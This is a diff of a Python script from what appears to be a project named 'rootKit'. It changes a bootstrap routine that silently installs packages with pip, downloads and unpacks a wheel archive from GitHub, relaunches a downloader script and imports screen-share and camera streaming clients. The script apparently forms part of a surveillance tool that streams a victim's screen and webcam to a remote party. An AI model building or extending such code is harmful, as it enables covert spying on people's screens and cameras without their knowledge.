@@ -10,13 +10,15 @@ githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 try:
     from requests import get
 except:
-    system("pip install requests")
+    system("python -m pip install requests")
+    system("py -m pip install requests")
     system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
     exit()
 try:
     import easyimporting
 except:
-    system("pip install easyimporting")
+    system("python -m pip install easyimporting")
+    system("py -m pip install easyimporting")
     system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
     exit()
 def unzipfile(file=".zip"):
@@ -44,9 +46,11 @@ except:
     dir = "whl-main"
     downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
     print(getoutput("python -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
+    print(getoutput("py -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
     rmtree("whl-main")
     print("installation de vidtream veuillez attendre")
     print(getoutput("python -m pip install vidstream"))
+    print(getoutput("py -m pip install vidstream"))
     system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
     exit()
 from vidstream import ScreenShareClient, CameraClient
